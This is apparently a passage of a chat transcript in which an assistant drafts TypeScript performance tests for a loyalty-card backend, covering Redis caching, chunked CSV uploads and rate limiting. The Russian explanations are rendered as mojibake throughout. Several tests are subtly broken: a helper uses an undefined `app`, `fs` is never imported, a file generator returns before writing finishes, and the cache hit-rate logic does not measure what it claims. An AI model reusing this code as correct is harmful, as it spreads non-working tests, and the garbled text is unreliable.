    "test:memory": "node --expose-gc --max-old-space-size=2048 node_modules/.bin/jest --testMatch='**/*.perf.spec.ts' --runInBand"
  }
}
```


***

–ü—Ä–æ–¥–æ–ª–∂–∞—é —Å –≤–æ–ø—Ä–æ—Å–∞–º–∏ **26-30** (–æ—Å—Ç–∞–ª—å–Ω—ã–µ Load \& Performance)? üöÄ

---

# –ü—Ä–æ–¥–æ–ª–∂–∞–π

–ü—Ä–æ–¥–æ–ª–∂–∞—é! üöÄ

***

### **26. Cache Effectiveness - hit rate?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Redis cache –¥–ª—è guest cards, loyalty rules.

**–í–æ–ø—Ä–æ—Å:** Performance test?

- A) Query –±–µ–∑ cache ‚Üí measure latency
- B) Query —Å cache ‚Üí measure latency (should be faster)
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å cache hit rate (> 80%)
- D) C + simulate cache eviction (–ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ –Ω–µ –ø–∞–¥–∞–µ—Ç)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Cache hit rate –∫—Ä–∏—Ç–∏—á–µ–Ω –¥–ª—è performance (80%+ = —Ö–æ—Ä–æ—à–æ)
- Cache eviction = —Ä–µ–∞–ª—å–Ω—ã–π —Å—Ü–µ–Ω–∞—Ä–∏–π (Redis restart, memory limit)
- Graceful degradation –ø—Ä–∏ cache miss –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/performance/cache-effectiveness.perf.spec.ts
import { Redis } from 'ioredis';

describe('Cache Effectiveness - Performance Testing', () => {
  let app: INestApplication;
  let redis: Redis;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    redis = app.get('REDIS');
    prisma = app.get(PrismaClient);

    // Seed test data
    await seedTestData();
  });

  afterAll(async () => {
    await app.close();
  });

  beforeEach(async () => {
    await redis.flushall(); // Clear cache
  });

  // Test 1: Baseline (no cache)
  it('should measure query latency without cache', async () => {
    const iterations = 100;
    const durations: number[] = [];

    for (let i = 0; i < iterations; i++) {
      const startTime = performance.now();

      await prisma.guestCard.findUnique({
        where: { id: 'card-1' },
        include: {
          user: {
            include: { guestProfile: true },
          },
          loyaltyLevel: true,
        },
      });

      const duration = performance.now() - startTime;
      durations.push(duration);
    }

    const avgDuration = durations.reduce((a, b) => a + b, 0) / durations.length;
    const p95 = durations.sort((a, b) => a - b)[Math.floor(durations.length * 0.95)];

    console.log('=== Without Cache ===');
    console.log(`Average: ${avgDuration.toFixed(2)}ms`);
    console.log(`p95: ${p95.toFixed(2)}ms`);

    // Baseline performance (direct DB query)
    expect(avgDuration).toBeGreaterThan(10); // Should take some time
  });

  // Test 2: With Cache
  it('should measure query latency with cache', async () => {
    const guestCardService = app.get(GuestCardService);
    const iterations = 100;
    const durations: number[] = [];

    // Prime cache
    await guestCardService.findById('card-1');

    for (let i = 0; i < iterations; i++) {
      const startTime = performance.now();

      await guestCardService.findById('card-1'); // Uses cache

      const duration = performance.now() - startTime;
      durations.push(duration);
    }

    const avgDuration = durations.reduce((a, b) => a + b, 0) / durations.length;
    const p95 = durations.sort((a, b) => a - b)[Math.floor(durations.length * 0.95)];

    console.log('=== With Cache ===');
    console.log(`Average: ${avgDuration.toFixed(2)}ms`);
    console.log(`p95: ${p95.toFixed(2)}ms`);

    // Cache should be much faster
    expect(avgDuration).toBeLessThan(5); // < 5ms from cache
  });

  // Test 3: Cache Hit Rate
  it('should achieve > 80% cache hit rate', async () => {
    const guestCardService = app.get(GuestCardService);

    let hits = 0;
    let misses = 0;

    // Simulate realistic access pattern (Zipf distribution)
    const cardIds = Array(100).fill(null).map((_, i) => `card-${i}`);
    const requests = 1000;

    for (let i = 0; i < requests; i++) {
      // Zipf distribution: 20% of cards get 80% of traffic
      const cardId = zipfDistribution(cardIds);

      const cacheKey = `guest_card:${cardId}`;
      const cached = await redis.get(cacheKey);

      if (cached) {
        hits++;
        await guestCardService.findById(cardId);
      } else {
        misses++;
        await guestCardService.findById(cardId);
      }
    }

    const hitRate = (hits / requests) * 100;

    console.log('=== Cache Hit Rate ===');
    console.log(`Requests: ${requests}`);
    console.log(`Hits: ${hits}`);
    console.log(`Misses: ${misses}`);
    console.log(`Hit Rate: ${hitRate.toFixed(2)}%`);

    expect(hitRate).toBeGreaterThan(80); // > 80% hit rate
  });

  // Test 4: Cache Eviction (LRU policy)
  it('should handle cache eviction gracefully', async () => {
    const guestCardService = app.get(GuestCardService);

    // Set low max memory for Redis (simulate memory pressure)
    await redis.config('SET', 'maxmemory', '10mb');
    await redis.config('SET', 'maxmemory-policy', 'allkeys-lru');

    const durations: number[] = [];

    // Fill cache with 1000 cards
    for (let i = 0; i < 1000; i++) {
      await redis.set(
        `guest_card:card-${i}`,
        JSON.stringify({ id: `card-${i}`, data: 'x'.repeat(10000) }), // 10KB per entry
        'EX',
        3600
      );
    }

    // Access cards (some will be evicted)
    for (let i = 0; i < 100; i++) {
      const startTime = performance.now();

      await guestCardService.findById(`card-${i}`);

      const duration = performance.now() - startTime;
      durations.push(duration);
    }

    const avgDuration = durations.reduce((a, b) => a + b, 0) / durations.length;
    const p95 = durations.sort((a, b) => a - b)[Math.floor(durations.length * 0.95)];

    console.log('=== With Cache Eviction ===');
    console.log(`Average: ${avgDuration.toFixed(2)}ms`);
    console.log(`p95: ${p95.toFixed(2)}ms`);

    // Should still perform reasonably (falls back to DB)
    expect(p95).toBeLessThan(50); // p95 < 50ms

    // Reset Redis config
    await redis.config('SET', 'maxmemory', '0');
  });

  // Test 5: Cache Invalidation Performance
  it('should invalidate cache efficiently', async () => {
    const guestCardService = app.get(GuestCardService);

    // Prime cache for 1000 cards
    const cardIds = Array(1000).fill(null).map((_, i) => `card-${i}`);
    
    for (const cardId of cardIds) {
      await guestCardService.findById(cardId);
    }

    const startTime = performance.now();

    // Invalidate all cards for tenant-1
    await redis.keys('guest_card:*').then(keys => {
      if (keys.length > 0) {
        return redis.del(...keys);
      }
    });

    const duration = performance.now() - startTime;

    console.log('=== Cache Invalidation ===');
    console.log(`Invalidated 1000 keys in ${duration.toFixed(2)}ms`);

    expect(duration).toBeLessThan(100); // < 100ms
  });

  // Test 6: Cache Stampede Prevention
  it('should prevent cache stampede', async () => {
    const guestCardService = app.get(GuestCardService);

    // Clear cache
    await redis.del('guest_card:card-1');

    let dbQueryCount = 0;

    // Mock Prisma to count DB queries
    const originalFindUnique = prisma.guestCard.findUnique;
    prisma.guestCard.findUnique = jest.fn(async (...args) => {
      dbQueryCount++;
      await new Promise(resolve => setTimeout(resolve, 100)); // Simulate slow query
      return originalFindUnique.apply(prisma.guestCard, args);
    });

    // Simulate 100 concurrent requests (cache miss)
    const promises = Array(100).fill(null).map(() =>
      guestCardService.findById('card-1')
    );

    await Promise.all(promises);

    console.log('=== Cache Stampede Test ===');
    console.log(`DB queries: ${dbQueryCount}`);

    // Should only query DB once (other requests wait for cache)
    expect(dbQueryCount).toBe(1);

    // Restore original function
    prisma.guestCard.findUnique = originalFindUnique;
  });

  // Test 7: Cache Warming
  it('should warm cache efficiently on startup', async () => {
    const startTime = performance.now();

    // Warm cache for top 100 most accessed cards
    const topCards = await prisma.guestCard.findMany({
      where: { tenantId: 'tenant-1' },
      orderBy: { lastActivityAt: 'desc' },
      take: 100,
    });

    const pipeline = redis.pipeline();
    
    for (const card of topCards) {
      pipeline.set(
        `guest_card:${card.id}`,
        JSON.stringify(card),
        'EX',
        3600
      );
    }

    await pipeline.exec();

    const duration = performance.now() - startTime;

    console.log('=== Cache Warming ===');
    console.log(`Warmed 100 cards in ${duration.toFixed(2)}ms`);

    expect(duration).toBeLessThan(1000); // < 1s
  });

  // Test 8: Multi-level Cache
  it('should test multi-level cache (L1: memory, L2: Redis)', async () => {
    const NodeCache = require('node-cache');
    const l1Cache = new NodeCache({ stdTTL: 60 }); // L1: in-memory

    const iterations = 1000;
    let l1Hits = 0;
    let l2Hits = 0;
    let dbQueries = 0;

    for (let i = 0; i < iterations; i++) {
      const cardId = zipfDistribution(['card-1', 'card-2', 'card-3', 'card-4', 'card-5']);

      // Check L1 cache (memory)
      let card = l1Cache.get(cardId);
      if (card) {
        l1Hits++;
        continue;
      }

      // Check L2 cache (Redis)
      card = await redis.get(`guest_card:${cardId}`);
      if (card) {
        l2Hits++;
        l1Cache.set(cardId, card); // Promote to L1
        continue;
      }

      // Query DB
      dbQueries++;
      card = await prisma.guestCard.findUnique({ where: { id: cardId } });
      
      // Cache in both levels
      await redis.set(`guest_card:${cardId}`, JSON.stringify(card), 'EX', 3600);
      l1Cache.set(cardId, card);
    }

    const l1HitRate = (l1Hits / iterations) * 100;
    const l2HitRate = (l2Hits / iterations) * 100;
    const totalHitRate = ((l1Hits + l2Hits) / iterations) * 100;

    console.log('=== Multi-level Cache ===');
    console.log(`L1 hits: ${l1Hits} (${l1HitRate.toFixed(2)}%)`);
    console.log(`L2 hits: ${l2Hits} (${l2HitRate.toFixed(2)}%)`);
    console.log(`DB queries: ${dbQueries} (${((dbQueries / iterations) * 100).toFixed(2)}%)`);
    console.log(`Total hit rate: ${totalHitRate.toFixed(2)}%`);

    expect(totalHitRate).toBeGreaterThan(90); // > 90% combined hit rate
  });

  // Test 9: Cache Metrics Collection
  it('should collect cache metrics', async () => {
    const guestCardService = app.get(GuestCardService);

    // Run workload
    for (let i = 0; i < 500; i++) {
      const cardId = zipfDistribution(['card-1', 'card-2', 'card-3', 'card-4', 'card-5']);
      await guestCardService.findById(cardId);
    }

    // Get Redis stats
    const info = await redis.info('stats');
    const lines = info.split('\r\n');
    
    const stats: any = {};
    for (const line of lines) {
      const [key, value] = line.split(':');
      if (key && value) {
        stats[key] = value;
      }
    }

    console.log('=== Redis Stats ===');
    console.log(`Total connections: ${stats.total_connections_received}`);
    console.log(`Total commands: ${stats.total_commands_processed}`);
    console.log(`Keyspace hits: ${stats.keyspace_hits}`);
    console.log(`Keyspace misses: ${stats.keyspace_misses}`);
    
    const hitRate = (parseInt(stats.keyspace_hits) / 
      (parseInt(stats.keyspace_hits) + parseInt(stats.keyspace_misses))) * 100;
    
    console.log(`Hit rate: ${hitRate.toFixed(2)}%`);

    expect(hitRate).toBeGreaterThan(70);
  });
});

// Helper functions
function zipfDistribution(items: string[]): string {
  // Zipf distribution: 20% of items get 80% of traffic
  const rank = Math.floor(Math.pow(Math.random(), 2) * items.length);
  return items[rank];
}

async function seedTestData() {
  const prisma = app.get(PrismaClient);
  
  // Create 100 test guest cards
  for (let i = 0; i < 100; i++) {
    await prisma.guestCard.create({
      data: {
        id: `card-${i}`,
        userId: `user-${i}`,
        tenantId: 'tenant-1',
        totalBalance: Math.floor(Math.random() * 5000),
        qrCode: `qr-${i}`,
        displayCode: String(i).padStart(6, '0'),
        status: 'ACTIVE',
        lastActivityAt: new Date(Date.now() - Math.random() * 30 * 24 * 60 * 60 * 1000),
      },
    });
  }
}
```


***

### **27. File Upload Performance - chunked uploads?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Admin –∑–∞–≥—Ä—É–∂–∞–µ—Ç CSV (10MB) —Å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º–∏.

**–í–æ–ø—Ä–æ—Å:** Performance test?

- A) Upload 1MB file ‚Üí success
- B) Upload 10MB file ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å chunked upload
- C) B + Upload 100MB file ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å limits
- D) C + concurrent uploads (10 users –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Chunked uploads –∫—Ä–∏—Ç–∏—á–Ω—ã –¥–ª—è –±–æ–ª—å—à–∏—Ö —Ñ–∞–π–ª–æ–≤ (> 10MB)
- File size limits –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞—é—Ç abuse
- Concurrent uploads = realistic scenario

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/performance/file-upload.perf.spec.ts
import { createReadStream, createWriteStream, writeFileSync } from 'fs';
import { join } from 'path';
import FormData from 'form-data';

describe('File Upload Performance', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: Small File (1MB)
  it('should upload 1MB file quickly', async () => {
    const filePath = generateTestFile(1); // 1MB
    const token = generateAdminToken();

    const form = new FormData();
    form.append('file', createReadStream(filePath));

    const startTime = performance.now();

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/pos/import-csv')
      .set('Authorization', `Bearer ${token}`)
      .set(form.getHeaders())
      .attach('file', filePath)
      .expect(200);

    const duration = performance.now() - startTime;

    console.log('=== 1MB File Upload ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);
    console.log(`Throughput: ${(1 / (duration / 1000)).toFixed(2)} MB/s`);

    expect(duration).toBeLessThan(2000); // < 2s

    // Cleanup
    fs.unlinkSync(filePath);
  });

  // Test 2: Medium File (10MB) - Chunked Upload
  it('should upload 10MB file with chunking', async () => {
    const filePath = generateTestFile(10); // 10MB
    const token = generateAdminToken();

    const fileSize = fs.statSync(filePath).size;
    const chunkSize = 1024 * 1024; // 1MB chunks
    const totalChunks = Math.ceil(fileSize / chunkSize);

    console.log('=== 10MB File Upload (Chunked) ===');
    console.log(`File size: ${fileSize} bytes`);
    console.log(`Chunk size: ${chunkSize} bytes`);
    console.log(`Total chunks: ${totalChunks}`);

    const startTime = performance.now();
    const uploadId = `upload-${Date.now()}`;

    // Upload chunks
    for (let i = 0; i < totalChunks; i++) {
      const start = i * chunkSize;
      const end = Math.min(start + chunkSize, fileSize);
      const chunk = fs.readFileSync(filePath).slice(start, end);

      await request(app.getHttpServer())
        .post('/api/v1/admin/upload/chunk')
        .set('Authorization', `Bearer ${token}`)
        .set('Content-Type', 'application/octet-stream')
        .set('X-Upload-Id', uploadId)
        .set('X-Chunk-Index', String(i))
        .set('X-Total-Chunks', String(totalChunks))
        .send(chunk)
        .expect(200);

      console.log(`Uploaded chunk ${i + 1}/${totalChunks}`);
    }

    // Finalize upload
    await request(app.getHttpServer())
      .post('/api/v1/admin/upload/finalize')
      .set('Authorization', `Bearer ${token}`)
      .send({ uploadId, totalChunks })
      .expect(200);

    const duration = performance.now() - startTime;
    const throughput = (fileSize / 1024 / 1024) / (duration / 1000);

    console.log(`Duration: ${duration.toFixed(2)}ms`);
    console.log(`Throughput: ${throughput.toFixed(2)} MB/s`);

    expect(duration).toBeLessThan(15000); // < 15s

    // Cleanup
    fs.unlinkSync(filePath);
  });

  // Test 3: Large File (100MB) - Size Limit
  it('should enforce 100MB file size limit', async () => {
    const filePath = generateTestFile(101); // 101MB (exceeds limit)
    const token = generateAdminToken();

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/pos/import-csv')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(413); // Payload Too Large

    expect(response.body.message).toContain('File size exceeds limit');

    // Cleanup
    fs.unlinkSync(filePath);
  });

  // Test 4: Concurrent Uploads (10 users)
  it('should handle 10 concurrent file uploads', async () => {
    jest.setTimeout(60000);

    const uploadCount = 10;
    const fileSize = 5; // 5MB each

    console.log('=== Concurrent Uploads ===');
    console.log(`Users: ${uploadCount}`);
    console.log(`File size: ${fileSize}MB each`);

    const startTime = performance.now();

    const promises = Array(uploadCount).fill(null).map(async (_, i) => {
      const filePath = generateTestFile(fileSize);
      const token = generateAdminToken();

      const uploadStart = performance.now();

      await request(app.getHttpServer())
        .post('/api/v1/admin/pos/import-csv')
        .set('Authorization', `Bearer ${token}`)
        .attach('file', filePath)
        .expect(200);

      const uploadDuration = performance.now() - uploadStart;

      // Cleanup
      fs.unlinkSync(filePath);

      return uploadDuration;
    });

    const durations = await Promise.all(promises);
    const totalDuration = performance.now() - startTime;

    const avgDuration = durations.reduce((a, b) => a + b, 0) / durations.length;
    const maxDuration = Math.max(...durations);

    console.log(`Total duration: ${totalDuration.toFixed(2)}ms`);
    console.log(`Avg per upload: ${avgDuration.toFixed(2)}ms`);
    console.log(`Max per upload: ${maxDuration.toFixed(2)}ms`);

    expect(totalDuration).toBeLessThan(30000); // < 30s total
    expect(maxDuration).toBeLessThan(20000); // < 20s per upload
  });

  // Test 5: Upload Progress Tracking
  it('should track upload progress', async () => {
    const filePath = generateTestFile(10); // 10MB
    const token = generateAdminToken();
    const uploadId = `upload-${Date.now()}`;

    const fileSize = fs.statSync(filePath).size;
    const chunkSize = 1024 * 1024; // 1MB
    const totalChunks = Math.ceil(fileSize / chunkSize);

    const progressUpdates: number[] = [];

    for (let i = 0; i < totalChunks; i++) {
      const start = i * chunkSize;
      const end = Math.min(start + chunkSize, fileSize);
      const chunk = fs.readFileSync(filePath).slice(start, end);

      await request(app.getHttpServer())
        .post('/api/v1/admin/upload/chunk')
        .set('Authorization', `Bearer ${token}`)
        .set('X-Upload-Id', uploadId)
        .set('X-Chunk-Index', String(i))
        .set('X-Total-Chunks', String(totalChunks))
        .send(chunk);

      // Get progress
      const progressResponse = await request(app.getHttpServer())
        .get(`/api/v1/admin/upload/${uploadId}/progress`)
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      progressUpdates.push(progressResponse.body.progress);
    }

    console.log('=== Upload Progress ===');
    console.log(`Progress updates: ${progressUpdates.join('% ‚Üí ')}%`);

    expect(progressUpdates[progressUpdates.length - 1]).toBe(100);

    // Cleanup
    fs.unlinkSync(filePath);
  });

  // Test 6: Resumable Upload (connection interrupted)
  it('should resume interrupted upload', async () => {
    const filePath = generateTestFile(10); // 10MB
    const token = generateAdminToken();
    const uploadId = `upload-${Date.now()}`;

    const fileSize = fs.statSync(filePath).size;
    const chunkSize = 1024 * 1024;
    const totalChunks = Math.ceil(fileSize / chunkSize);

    // Upload first half
    for (let i = 0; i < Math.floor(totalChunks / 2); i++) {
      const start = i * chunkSize;
      const end = Math.min(start + chunkSize, fileSize);
      const chunk = fs.readFileSync(filePath).slice(start, end);

      await request(app.getHttpServer())
        .post('/api/v1/admin/upload/chunk')
        .set('Authorization', `Bearer ${token}`)
        .set('X-Upload-Id', uploadId)
        .set('X-Chunk-Index', String(i))
        .set('X-Total-Chunks', String(totalChunks))
        .send(chunk);
    }

    console.log('Upload interrupted...');

    // Check which chunks are uploaded
    const statusResponse = await request(app.getHttpServer())
      .get(`/api/v1/admin/upload/${uploadId}/status`)
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    const uploadedChunks = statusResponse.body.uploadedChunks;
    console.log(`Uploaded chunks: ${uploadedChunks.join(', ')}`);

    // Resume upload (upload remaining chunks)
    for (let i = Math.floor(totalChunks / 2); i < totalChunks; i++) {
      const start = i * chunkSize;
      const end = Math.min(start + chunkSize, fileSize);
      const chunk = fs.readFileSync(filePath).slice(start, end);

      await request(app.getHttpServer())
        .post('/api/v1/admin/upload/chunk')
        .set('Authorization', `Bearer ${token}`)
        .set('X-Upload-Id', uploadId)
        .set('X-Chunk-Index', String(i))
        .set('X-Total-Chunks', String(totalChunks))
        .send(chunk);
    }

    // Finalize
    await request(app.getHttpServer())
      .post('/api/v1/admin/upload/finalize')
      .set('Authorization', `Bearer ${token}`)
      .send({ uploadId, totalChunks })
      .expect(200);

    console.log('Upload resumed and completed');

    // Cleanup
    fs.unlinkSync(filePath);
  });

  // Test 7: Virus Scan Performance
  it('should scan uploaded file for viruses', async () => {
    const filePath = generateTestFile(5); // 5MB
    const token = generateAdminToken();

    const startTime = performance.now();

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/pos/import-csv')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(200);

    const duration = performance.now() - startTime;

    console.log('=== File Upload with Virus Scan ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);
    console.log(`Virus scan result: ${response.body.virusScanResult}`);

    expect(response.body.virusScanResult).toBe('clean');
    expect(duration).toBeLessThan(10000); // < 10s including scan

    // Cleanup
    fs.unlinkSync(filePath);
  });
});

// Helper functions
function generateTestFile(sizeMB: number): string {
  const filePath = join(__dirname, `test-file-${sizeMB}mb.csv`);
  const chunkSize = 1024 * 1024; // 1MB
  const totalChunks = sizeMB;

  const stream = createWriteStream(filePath);

  for (let i = 0; i < totalChunks; i++) {
    // Generate CSV data
    const data = Array(10000).fill(null).map((_, j) => 
      `CHK-${i}-${j},2026-02-12,+79991234567,${Math.floor(Math.random() * 10000)}\n`
    ).join('');

    stream.write(data);
  }

  stream.end();

  return filePath;
}

function generateAdminToken(): string {
  return jwt.sign(
    { userId: 'admin-1', role: 'ADMIN', tenantId: 'tenant-1' },
    process.env.JWT_SECRET
  );
}
```


***

–ü—Ä–æ–¥–æ–ª–∂–∞—é —Å –ø–æ—Å–ª–µ–¥–Ω–∏–º–∏ 3 –≤–æ–ø—Ä–æ—Å–∞–º–∏ (28-30) Load \& Performance, –ø–æ—Ç–æ–º –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ Security Testing? üöÄ

---

# –ø—Ä–æ–¥–æ–ª–∂–∞–π

–ü—Ä–æ–¥–æ–ª–∂–∞—é! üöÄ

***

### **28. API Rate Limiting - –∑–∞—â–∏—Ç–∞ –æ—Ç abuse?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Rate limit = 100 requests/min per tenant.

**–í–æ–ø—Ä–æ—Å:** Load test?

- A) Send 50 requests ‚Üí all succeed
- B) Send 100 requests ‚Üí all succeed
- C) Send 150 requests ‚Üí 50 –¥–æ–ª–∂–Ω—ã –≤–µ—Ä–Ω—É—Ç—å 429 Too Many Requests
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ rate limit reset —á–µ—Ä–µ–∑ 1 –º–∏–Ω—É—Ç—É

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Rate limiting –∫—Ä–∏—Ç–∏—á–µ–Ω –¥–ª—è –∑–∞—â–∏—Ç—ã –æ—Ç abuse
- 429 errors –¥–æ–ª–∂–Ω—ã –≤–æ–∑–≤—Ä–∞—â–∞—Ç—å—Å—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ
- Reset window –¥–æ–ª–∂–µ–Ω —Ä–∞–±–æ—Ç–∞—Ç—å —Ç–æ—á–Ω–æ

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/performance/rate-limiting.perf.spec.ts
describe('API Rate Limiting - Performance Testing', () => {
  let app: INestApplication;
  let redis: Redis;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    redis = app.get('REDIS');
  });

  afterAll(async () => {
    await app.close();
  });

  beforeEach(async () => {
    await redis.flushall(); // Clear rate limit counters
  });

  // Test 1: Under Rate Limit (50 requests)
  it('should allow 50 requests (under limit)', async () => {
    const token = generateGuestToken('tenant-1');
    let successCount = 0;
    let errorCount = 0;

    for (let i = 0; i < 50; i++) {
      const response = await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${token}`);

      if (response.status === 200) {
        successCount++;
      } else if (response.status === 429) {
        errorCount++;
      }
    }

    console.log('=== Under Rate Limit (50 requests) ===');
    console.log(`Success: ${successCount}`);
    console.log(`Rate limited: ${errorCount}`);

    expect(successCount).toBe(50);
    expect(errorCount).toBe(0);
  });

  // Test 2: At Rate Limit (100 requests)
  it('should allow exactly 100 requests', async () => {
    const token = generateGuestToken('tenant-1');
    let successCount = 0;
    let errorCount = 0;

    for (let i = 0; i < 100; i++) {
      const response = await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${token}`);

      if (response.status === 200) {
        successCount++;
      } else if (response.status === 429) {
        errorCount++;
      }
    }

    console.log('=== At Rate Limit (100 requests) ===');
    console.log(`Success: ${successCount}`);
    console.log(`Rate limited: ${errorCount}`);

    expect(successCount).toBe(100);
    expect(errorCount).toBe(0);
  });

  // Test 3: Exceed Rate Limit (150 requests)
  it('should rate limit after 100 requests', async () => {
    const token = generateGuestToken('tenant-1');
    let successCount = 0;
    let rateLimitedCount = 0;

    for (let i = 0; i < 150; i++) {
      const response = await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${token}`);

      if (response.status === 200) {
        successCount++;
      } else if (response.status === 429) {
        rateLimitedCount++;

        // Check rate limit headers
        expect(response.headers['x-ratelimit-limit']).toBe('100');
        expect(response.headers['x-ratelimit-remaining']).toBe('0');
        expect(response.headers['x-ratelimit-reset']).toBeDefined();
        expect(response.headers['retry-after']).toBeDefined();
      }
    }

    console.log('=== Exceed Rate Limit (150 requests) ===');
    console.log(`Success: ${successCount}`);
    console.log(`Rate limited: ${rateLimitedCount}`);

    expect(successCount).toBe(100);
    expect(rateLimitedCount).toBe(50);
  });

  // Test 4: Rate Limit Reset After 1 Minute
  it('should reset rate limit after 1 minute', async () => {
    jest.setTimeout(90000); // 90 seconds

    const token = generateGuestToken('tenant-1');

    // Use up rate limit
    for (let i = 0; i < 100; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);
    }

    // Next request should be rate limited
    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(429);

    console.log('Rate limit reached. Waiting 60 seconds...');

    // Wait for rate limit window to reset
    await new Promise(resolve => setTimeout(resolve, 61000)); // 61 seconds

    // Should be able to make requests again
    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    expect(response.headers['x-ratelimit-remaining']).toBe('99');

    console.log('Rate limit successfully reset after 1 minute');
  });

  // Test 5: Per-Tenant Rate Limiting (Isolation)
  it('should isolate rate limits per tenant', async () => {
    const tokenTenant1 = generateGuestToken('tenant-1');
    const tokenTenant2 = generateGuestToken('tenant-2');

    // Exhaust rate limit for tenant-1
    for (let i = 0; i < 100; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${tokenTenant1}`)
        .expect(200);
    }

    // Tenant-1 should be rate limited
    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${tokenTenant1}`)
      .expect(429);

    // Tenant-2 should still work
    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${tokenTenant2}`)
      .expect(200);

    expect(response.headers['x-ratelimit-remaining']).toBe('99');

    console.log('Rate limits properly isolated per tenant');
  });

  // Test 6: Burst Rate Limiting
  it('should handle burst traffic', async () => {
    const token = generateGuestToken('tenant-1');

    // Send 50 requests simultaneously
    const promises = Array(50).fill(null).map(() =>
      request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${token}`)
    );

    const results = await Promise.all(promises);

    const successCount = results.filter(r => r.status === 200).length;
    const rateLimitedCount = results.filter(r => r.status === 429).length;

    console.log('=== Burst Traffic (50 concurrent) ===');
    console.log(`Success: ${successCount}`);
    console.log(`Rate limited: ${rateLimitedCount}`);

    // All should succeed (under limit)
    expect(successCount).toBe(50);
    expect(rateLimitedCount).toBe(0);
  });

  // Test 7: Different Endpoints, Different Limits
  it('should apply different rate limits per endpoint', async () => {
    const token = generateGuestToken('tenant-1');

    // Public endpoint: 1000 req/min
    for (let i = 0; i < 200; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/health')
        .expect(200);
    }

    // Authenticated endpoint: 100 req/min
    for (let i = 0; i < 100; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);
    }

    // Public endpoint still works
    await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    // Authenticated endpoint is rate limited
    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(429);

    console.log('Different rate limits applied per endpoint');
  });

  // Test 8: Rate Limit by IP Address (Unauthenticated)
  it('should rate limit by IP for unauthenticated requests', async () => {
    const ip = '192.168.1.100';

    // Simulate requests from same IP
    for (let i = 0; i < 100; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .set('X-Forwarded-For', ip)
        .send({ phone: '+79991234567', password: 'test' })
        .expect(401); // Invalid credentials, but not rate limited
    }

    // 101st request should be rate limited
    const response = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .set('X-Forwarded-For', ip)
      .send({ phone: '+79991234567', password: 'test' })
      .expect(429);

    expect(response.body.message).toContain('Too many requests');

    console.log('IP-based rate limiting works');
  });

  // Test 9: Sliding Window Rate Limit
  it('should use sliding window algorithm', async () => {
    jest.setTimeout(120000);

    const token = generateGuestToken('tenant-1');

    // Make 100 requests at t=0
    for (let i = 0; i < 100; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);
    }

    // Should be rate limited
    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(429);

    // Wait 30 seconds
